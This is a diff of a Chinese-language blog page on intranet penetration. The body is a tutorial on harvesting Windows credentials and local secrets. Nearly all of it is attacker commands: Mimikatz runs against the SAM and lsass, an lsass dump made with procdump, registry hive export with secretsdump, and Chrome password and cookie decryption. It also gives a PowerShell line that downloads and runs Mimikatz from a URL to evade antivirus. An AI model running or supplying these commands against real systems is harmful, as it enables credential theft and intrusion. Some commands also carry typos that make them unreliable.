@@ -1,163 +1,19 @@
-<!DOCTYPE html>
-<html lang=en>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="内网信息收集二凭证信息收集 密码哈希 哈希类型分为两种：  LM型 NTLM型  下面是windows不同版本所使用的哈希类型   对于2003之前版本，密码位数大于14位时使用NTLM型；后续版本均默认使用NTLM型哈希值  主流密码抓取凭证工具  mimikatz 从内存当中抓取当前登录用户的密码及其哈希值 常用本地非交互式凭证获取。实际场景由于是上传一个mimikatz，很多shell并不支">
-<meta property="og:type" content="article">
-<meta property="og:title" content="内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取">
-<meta property="og:url" content="https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/index.html">
-<meta property="og:site_name" content="RacerZ">
-<meta property="og:description" content="内网信息收集二凭证信息收集 密码哈希 哈希类型分为两种：  LM型 NTLM型  下面是windows不同版本所使用的哈希类型   对于2003之前版本，密码位数大于14位时使用NTLM型；后续版本均默认使用NTLM型哈希值  主流密码抓取凭证工具  mimikatz 从内存当中抓取当前登录用户的密码及其哈希值 常用本地非交互式凭证获取。实际场景由于是上传一个mimikatz，很多shell并不支">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20220928152057449.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/image-20230103234333919.png">
-<meta property="article:published_time" content="2023-01-03T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-01-04T02:58:28.151Z">
-<meta property="article:author" content="RacerZ">
-<meta property="article:tag" content="内网渗透">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20220928152057449.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<!-- hexo injector head_end start -->
+<!DOCTYPE html><html lang="en" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取 | RacerZ</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches) document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches) document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><!-- hexo injector head_end start -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2023/01/05/Hibernate%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2023/01/04/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&text=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&title=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&is_video=false&description=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取&body=Check out this article: https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&title=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&title=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&title=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&title=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&name=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&t=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C"><span class="toc-number">1.</span> <span class="toc-text">内网信息收集二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">凭证信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">本地信息收集</span></a></li></ol></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">RacerZ</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2023-01-03T16:00:00.000Z" itemprop="datePublished">2023-01-04</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
-    </div>
-
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <h3 id="内网信息收集二"><a href="#内网信息收集二" class="headerlink" title="内网信息收集二"></a>内网信息收集二</h3><h4 id="凭证信息收集"><a href="#凭证信息收集" class="headerlink" title="凭证信息收集"></a>凭证信息收集</h4><ul>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-01-03T16:00:00.000Z" id="date"> 2023-01-04</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-01-04T02:58:28.151Z" id="updated"> 2023-01-04</time></div></span></div></div><hr><div id="post-content"><h3 id="内网信息收集二"><a href="#内网信息收集二" class="headerlink" title="内网信息收集二"></a>内网信息收集二</h3><h4 id="凭证信息收集"><a href="#凭证信息收集" class="headerlink" title="凭证信息收集"></a>凭证信息收集</h4><ul>
 <li><p><strong>密码哈希</strong></p>
 <p>哈希类型分为两种：</p>
 <ul>
@@ -165,7 +21,7 @@
 <li>NTLM型</li>
 </ul>
 <p>下面是windows不同版本所使用的哈希类型</p>
-<p> <img src="https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20220928152057449.png" alt="image-20220928152057449"></p>
+<p class='item-img' data-src='https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20220928152057449.png'><img src="https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20220928152057449.png" alt="image-20220928152057449"></p>
 <p>对于2003之前版本，密码位数大于14位时使用NTLM型；后续版本均默认使用NTLM型哈希值</p>
 </li>
 <li><p>主流密码抓取凭证工具</p>
@@ -173,7 +29,7 @@
 <li><p><strong>mimikatz</strong></p>
 <p>从内存当中抓取当前登录用户的密码及其哈希值</p>
 <p>常用本地非交互式凭证获取。实际场景由于是上传一个mimikatz，很多shell并不支持交互式使用，因此常用非交互式获取凭证</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line"> </span><br><span class="line">mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mimikatz">mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;<br> <br>mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;<br></code></pre></td></tr></table></figure>
 <ul>
 <li><code>log res.txt</code> 将日志记录到res.txt中</li>
 <li><code>privilege::debug</code>  通过debug模式提权</li>
@@ -183,21 +39,21 @@
 <li><code>sekurlsa::logonpasswords</code>  获取账户密码的明文值，获取不到的话回显null</li>
 </ul>
 <p>对于低版本<code>1.x</code>的mimikatz，使用方式如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug // 提权</span><br><span class="line">inject::process lsass.exe sekurlsa.dll   // 注入sekurlsa.dll 到 lsass.exe进程 lsass.exe在系统启动后会记录密码信息</span><br><span class="line">@getLogonPasswords获取密码</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mimikatz">privilege::debug // 提权<br>inject::process lsass.exe sekurlsa.dll   // 注入sekurlsa.dll 到 lsass.exe进程 lsass.exe在系统启动后会记录密码信息<br>@getLogonPasswords获取密码<br></code></pre></td></tr></table></figure>
 <p><strong>免杀操作</strong></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/234365.html">https://www.freebuf.com/articles/system/234365.html</a></p>
 <p>绕过查杀的方式之一：<strong>Powershell远程加载mimikatz脚本</strong></p>
 <p>可以针对关键字进行混淆</p>
-<p><img src="/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/image-20230103234333919.png" alt="image-20230103234333919"></p>
+<p class='item-img' data-src='/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/image-20230103234333919.png'><img src="/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/image-20230103234333919.png" alt="image-20230103234333919"></p>
 <p>IEX会将对象加载进内存中并执行后面的函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX (New-Object-Net WebClient).DownloadString(&quot;url&quot;); Invoke-Mimikatz-DumpCreds</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell.exe IEX (New-Object-Net WebClient).DownloadString(&quot;url&quot;); Invoke-Mimikatz-DumpCreds<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>wce</strong></p>
 <p>适用于win7低版本操作系统</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-w 获取明文密码</span><br><span class="line">-l 获取当前在线用户NTLM哈希值</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-w 获取明文密码<br>-l 获取当前在线用户NTLM哈希值<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>Pwddump7</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwddump7.exe &gt; res.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwddump7.exe &gt; res.txt<br></code></pre></td></tr></table></figure>
 <p>获取当前系统各个密码的哈希值</p>
 <p>解密利用彩虹表 <a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
 </li>
@@ -205,187 +61,64 @@
 <p>配合彩虹表自己破解</p>
 <p>工具下载：<a target="_blank" rel="noopener" href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a></p>
 <p>彩虹表：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://ophcrack.sourceforge.io/tables.php</span><br><span class="line">http://project-rainbowcrack.com/table.htm</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://ophcrack.sourceforge.io/tables.php<br>http://project-rainbowcrack.com/table.htm<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>Procdump+Mimikatz</strong></p>
 <p>Procdump的作用主要是免杀，现在可以用的是<code>SharpDump</code>(C#写的不太会编译…)</p>
 <p>会将当前系统进程当中的哈希保存到bin文件，改成zip文件并解压</p>
 <p>主要流程就是 将lsass进程导出，形成转储文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32位操作系统: processdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">64位操作系统: processdump.exe -ma lsass.exe lsass,dmp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">32位操作系统: processdump.exe -accepteula -ma lsass.exe lsass.dmp<br>64位操作系统: processdump.exe -ma lsass.exe lsass,dmp<br></code></pre></td></tr></table></figure>
 <p>然后再使用之前Mimikatz的模块提取明文密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekursa::mimidump lsass.dmp</span><br><span class="line">sekursa::logonPasswords full</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sekursa::mimidump lsass.dmp<br>sekursa::logonPasswords full<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>注册表导出</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security security.hiv</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">reg save HKLM\SYSTEM system.hiv<br>reg save HKLM\SAM sam.hiv<br>reg save HKLM\SECURITY security security.hiv<br></code></pre></td></tr></table></figure>
 <p>获取注册表中的SAM信息、用户登录密码哈希信息并导出为文件</p>
 <p>再利用下面的方式进行明文获取</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /system.hiv /sam:sam.hiv&quot;  exit</span><br><span class="line"> </span><br><span class="line">python secretsdump.py -sam -sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mimikatz.exe &quot;lsadump::sam /system.hiv /sam:sam.hiv&quot;  exit<br> <br>python secretsdump.py -sam -sam.hiv -security security.hiv -system system.hiv LOCAL<br></code></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a> 多种恢复本地信息密码的工具</p>
 </li>
 </ol>
 <h4 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h4><ol>
 <li><p><strong>IE浏览器代理信息查看</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Setting&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Setting&quot;<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>Windows Wifi密码获取</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show profile name=&quot;wifiName&quot; key=clear</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh wlan show profile name=&quot;wifiName&quot; key=clear<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>Windows hosts config</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">type C:\Windows\System32\drivers\etc\hosts<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>Windows IIS config</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IIS6: </span><br><span class="line">cscript.exe C:\Inetpub\AdminScripts\adsuitil</span><br><span class="line">.vbs ENUM W3SVC/1/root</span><br><span class="line"> </span><br><span class="line">IIS7/8:</span><br><span class="line">列出网站列表: %systemroot%/system32/inetsrv/appcmd.exe list site</span><br><span class="line">列出网站物理路径: %systemroot%\system32\inetsrv\appcmd.cxe list vdir</span><br><span class="line"> </span><br><span class="line">Mimikatz读取IIS7配置文件密码:</span><br><span class="line">mimikatz.exe privilege::debug log &quot;iis::apphost/in&quot;%systemroot%\system32\inetsrv\config\applicationHost config&quot; /live&quot; exit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">IIS6: <br>cscript.exe C:\Inetpub\AdminScripts\adsuitil<br>.vbs ENUM W3SVC/1/root<br> <br>IIS7/8:<br>列出网站列表: %systemroot%/system32/inetsrv/appcmd.exe list site<br>列出网站物理路径: %systemroot%\system32\inetsrv\appcmd.cxe list vdir<br> <br>Mimikatz读取IIS7配置文件密码:<br>mimikatz.exe privilege::debug log &quot;iis::apphost/in&quot;%systemroot%\system32\inetsrv\config\applicationHost config&quot; /live&quot; exit<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>Windows回收站信息获取</strong></p>
 <p>回收站路径为<code>C:\$Recycle.Bin</code>，不同用户对应不同的回收站，需要遍历一下用户id值来找各自删除的文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /f &quot;skip=1 tokens=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;)do dir /a/b</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">FOR /f &quot;skip=1 tokens=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;)do dir /a/b<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>Chrome的密码和cookie获取</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%localappdata%\google\chrom\USERDA~1\dedault\LOGIND~1</span><br><span class="line">%localappdata%\google\chrom\USERDA~1\dedault\cookies</span><br><span class="line"></span><br><span class="line">chrom用户信息保存在本地为sqlite数据库格式</span><br><span class="line"></span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrom/in:%localappdata%\google\chrom\USERDA~1\default\cookies /unprotect&quot; exit</span><br><span class="line"> </span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrom/in:%localappdata%\google\chrom\USERDA~1\default\LOGIND~1&quot; exit</span><br></pre></td></tr></table></figure>
